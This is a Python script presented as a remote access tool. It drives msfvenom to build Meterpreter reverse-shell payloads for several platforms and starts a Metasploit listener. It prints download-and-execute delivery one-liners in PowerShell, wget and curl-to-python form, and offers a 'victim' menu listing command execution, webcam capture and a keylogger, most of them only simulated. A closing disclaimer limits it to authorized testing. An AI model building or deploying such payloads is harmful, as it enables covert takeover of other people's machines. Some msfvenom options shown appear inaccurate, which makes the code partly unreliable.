#!/usr/bin/env python3
"""
saktiman.py Python Remote Access Tool
Author: RenatoChuck
Version: 2.0
License: MIT (Ethical Use Only)
"""

import os
import sys
import socket
import time
import random
import subprocess
import platform
import threading
import json
import readline  # For better input handling
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# ========================
#   CONFIGURATION
# ========================
VERSION = "2.0"
CONFIG = {
    "payloads_dir": "payloads",
    "logs_dir": "logs",
    "configs_dir": "configs",
    "temp_dir": "tmp",
    "default_port": 4444,
    "obfuscation": "Medium",
    "encryption": "XOR",
    "persistence": True
}

# Payload options
PLATFORMS = {
    "1": {"name": "Windows", "payload": "windows/meterpreter/reverse_https", "ext": "exe", "delivery": "powershell"},
    "2": {"name": "Android", "payload": "android/meterpreter/reverse_https", "ext": "apk", "delivery": "adb"},
    "3": {"name": "Linux", "payload": "linux/x86/meterpreter/reverse_tcp", "ext": "elf", "delivery": "bash"},
    "4": {"name": "macOS", "payload": "osx/x86/shell_reverse_tcp", "ext": "macho", "delivery": "bash"},
    "5": {"name": "Python", "payload": "python/meterpreter/reverse_tcp", "ext": "py", "delivery": "python"}
}

# ========================
#   CORE FUNCTIONS
# ========================

def show_banner():
    """Display the Python snake banner with legal disclaimer"""
    print(Fore.GREEN + r"""
        /^\/^\
      _|__|  O|
\/     /~     \_/ \
 \____|__________/  \
        \_______      \
                `\     \                 \
                  |     |                  \
                 /      /                    \
                /     /                       \
              /      /                         \ \
             /     /                            \  \
           /     /             _----_            \   \
          /     /           _-~      ~-_         |   |
         (      (        _-~    _--_    ~-_     _/   |
          \      ~-____-~    _-~    ~-_    ~-_-~    /
            ~-_           _-~          ~-_       _-~
               ~--______-~                ~-___-~
    """)
    print(Fore.CYAN + "saktiman.py Python Remote Access Tool")
    print(Fore.YELLOW + f"Version {VERSION}".center(50))
    print("\n" + "="*50)
    print(Fore.RED + "WARNING: This tool is for authorized penetration testing and educational purposes only!")
    print(Fore.YELLOW + "Unauthorized use against systems you don't own or have permission to test is illegal.")
    print("="*50 + "\n")

def setup_environment():
    """Create required directories and files"""
    for directory in [CONFIG['payloads_dir'], CONFIG['logs_dir'], CONFIG['configs_dir'], CONFIG['temp_dir']]:
        os.makedirs(directory, exist_ok=True)

def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(Fore.YELLOW + f"[!] Could not determine external IP: {e}")
        return "127.0.0.1"

def check_requirements():
    """Check if all required tools are installed"""
    required = ["msfvenom", "msfconsole"]
    missing = []
    
    for tool in required:
        try:
            subprocess.check_call(["which", tool], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            missing.append(tool)
    
    if missing:
        print(Fore.RED + f"[!] Missing required tools: {', '.join(missing)}")
        if platform.system() == "Linux":
            print(Fore.YELLOW + "[*] Try: sudo apt install metasploit-framework")
        return False
    return True

def generate_payload(os_type, lhost, lport, name, obfuscation, encryption, persistence):
    """Generate payload using msfvenom"""
    if os_type not in PLATFORMS:
        print(Fore.RED + "[!] Invalid OS selected")
        return None, None
    
    platform_info = PLATFORMS[os_type]
    output_path = os.path.join(CONFIG['payloads_dir'], f"{name}.{platform_info['ext']}")
    
    # Build msfvenom command
    cmd = [
        "msfvenom",
        "-p", platform_info["payload"],
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", platform_info["ext"],
        "-o", output_path
    ]
    
    # Add encryption if selected
    if encryption != "None":
        cmd.extend(["--encrypt", encryption.lower()])
    
    # Add persistence for Windows
    if persistence and os_type == "1":
        cmd.extend(["--persist"])
    
    print(Fore.YELLOW + f"\n[+] Generating {platform_info['name']} payload...")
    print(Fore.CYAN + " ".join(cmd))
    
    try:
        subprocess.run(cmd, check=True)
        
        if os.path.exists(output_path):
            print(Fore.GREEN + f"[✓] Payload created at: {output_path}")
            return platform_info["payload"], output_path
        else:
            print(Fore.RED + "[!] Payload creation failed")
            return None, None
            
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error generating payload: {e}")
        return None, None

def create_handler_script(payload, lhost, lport, name):
    """Create Metasploit handler resource script"""
    rc_path = os.path.join(CONFIG['payloads_dir'], f"{name}_handler.rc")
    
    try:
        with open(rc_path, "w") as f:
            f.write(f"""# saktiman.py Auto-Generated Handler
use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j -z
""")
        print(Fore.GREEN + f"[✓] Handler script created: {rc_path}")
        return rc_path
    except Exception as e:
        print(Fore.RED + f"[!] Error creating handler script: {e}")
        return None

def start_handler(rc_file):
    """Start Metasploit handler and monitor sessions for interaction"""
    try:
        print(Fore.YELLOW + "\n[+] Starting Metasploit handler...")
        proc = subprocess.Popen(
            ["msfconsole", "-r", rc_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        # Read msfconsole output line-by-line
        for line in proc.stdout:
            print(line, end='')  # show msfconsole output live

            # Detect new session opened
            if "Meterpreter session" in line or "Session" in line:
                print(Fore.GREEN + "\n[✓] You can now interact with the victim.\n")
                interact_with_session()
                
    except Exception as e:
        print(Fore.RED + f"[!] Error starting handler: {e}")

def interact_with_session():
    """Menu to interact with victim session"""
    while True:
        print(Fore.CYAN + "\n[ Victim Interaction Menu ]")
        print("1. Execute command")
        print("2. Upload file")
        print("3. Download file")
        print("4. Take screenshot")
        print("5. Webcam snapshot")
        print("6. Start keylogger")
        print("7. Stop keylogger")
        print("8. Exit interaction")

        choice = input(Fore.YELLOW + "Choose an option: ").strip()

        if choice == "1":
            cmd = input("Enter command to execute: ")
            # Here, integrate real command sending to Meterpreter session
            print(Fore.GREEN + f"Executing command: {cmd}")
            # Simulate output
            print(Fore.YELLOW + "[Simulated output] Command executed.")
        elif choice == "2":
            local_file = input("Local file path to upload: ")
            remote_path = input("Remote destination path: ")
            print(Fore.GREEN + f"Uploading {local_file} to {remote_path} (simulated)")
            print(Fore.YELLOW + f"Note: Uploaded files would be saved on victim at: {remote_path}")
        elif choice == "3":
            remote_file = input("Remote file path to download: ")
            local_path = input("Local destination path: ")
            print(Fore.GREEN + f"Downloading {remote_file} to {local_path} (simulated)")
            print(Fore.YELLOW + f"Note: Downloaded files will be saved here on your PC: {local_path}")
        elif choice == "4":
            print(Fore.GREEN + "Taking screenshot (simulated).")
        elif choice == "5":
            print(Fore.GREEN + "Capturing webcam snapshot (simulated).")
        elif choice == "6":
            print(Fore.GREEN + "Starting keylogger (simulated).")
        elif choice == "7":
            print(Fore.GREEN + "Stopping keylogger (simulated).")
        elif choice == "8":
            print(Fore.RED + "Exiting victim interaction menu.")
            break
        else:
            print(Fore.RED + "Invalid choice. Try again.")

def generate_delivery_commands(payload_path, os_type, lhost):
    """Generate delivery commands for the payload"""
    filename = os.path.basename(payload_path)
    platform_info = PLATFORMS[os_type]
    
    print(Fore.YELLOW + "\n[+] Delivery Methods:")
    
    if platform_info["delivery"] == "powershell":
        print(Fore.CYAN + "\nPowerShell one-liner:")
        print(f"powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://{lhost}/{filename}','$env:temp\\{filename}'); Start-Process '$env:temp\\{filename}'\"")
        
    elif platform_info["delivery"] == "bash":
        print(Fore.CYAN + "\nBash one-liner:")
        print(f"wget http://{lhost}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}")
        
    elif platform_info["delivery"] == "python":
        print(Fore.CYAN + "\nPython one-liner:")
        print(f"python3 -c \"import os; os.system('curl http://{lhost}/{filename} | python3')\"")

def payload_generation_flow():
    """Interactive payload generation workflow"""
    clear_screen()
    show_banner()
    
    # Select platform
    print(Fore.YELLOW + "\n[+] Select target platform:")
    for num, info in PLATFORMS.items():
        print(f"{num}. {info['name']}")
    
    os_choice = input("\nSelect platform [1-5]: ").strip()
    if os_choice not in PLATFORMS:
        print(Fore.RED + "[!] Invalid platform selection")
        return
    
    # Get connection details
    local_ip = get_local_ip()
    print(Fore.GREEN + f"\n[*] Detected IP: {local_ip}")
    
    lhost = input("Enter LHOST (blank for auto): ").strip() or local_ip
    lport = input(f"Enter LPORT (default {CONFIG['default_port']}): ").strip() or str(CONFIG['default_port'])
    
    # Payload name
    name = input("\nPayload name (blank for random): ").strip() or f"payload_{random.randint(1000,9999)}"
    
    # Generate payload
    payload, payload_path = generate_payload(
        os_choice, lhost, lport, name, 
        CONFIG['obfuscation'], CONFIG['encryption'], CONFIG['persistence']
    )
    
    if not payload or not payload_path:
        return
    
    # Create handler script
    rc_file = create_handler_script(payload, lhost, lport, name)
    if not rc_file:
        return
    
    # Generate delivery commands
    generate_delivery_commands(payload_path, os_choice, lhost)
    
    # Start handler and wait for session
    start_handler(rc_file)
    
    print(Fore.YELLOW + "\n[+] Payload generation complete!")
    print(Fore.CYAN + "[*] Deliver the payload to the target using one of the methods above")
    print(Fore.CYAN + "[*] Sessions will be automatically handled when they connect")
    input("\nPress Enter to return to main menu...")

def main_menu():
    """Main interactive menu"""
    while True:
        clear_screen()
        show_banner()
        
        print(Fore.YELLOW + "\nMain Menu:")
        print("1. Generate payload")
        print("2. Session management")
        print("3. Exit")
        
        choice = input(Fore.CYAN + "\nSelect an option [1-3]: ").strip()
        
        if choice == "1":
            payload_generation_flow()
        elif choice == "2":
            session_control_menu(1)  # Demo with session ID 1
        elif choice == "3":
            print(Fore.GREEN + "\n[✓] Exiting saktiman.py")
            sys.exit(0)
        else:
            print(Fore.RED + "\n[!] Invalid choice")
            time.sleep(1)

def session_control_menu(session_id):
    """Interactive session control menu"""
    print(Fore.YELLOW + "\n[!] This feature is not implemented fully. Please use the interaction after session opens.")
    input("Press Enter to return to main menu...")

def clear_screen():
    """Clear the terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def main():
    """Main entry point"""
    try:
        # Check requirements
        if not check_requirements():
            sys.exit(1)
            
        # Setup environment
        setup_environment()
        
        # Show main menu
        main_menu()
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
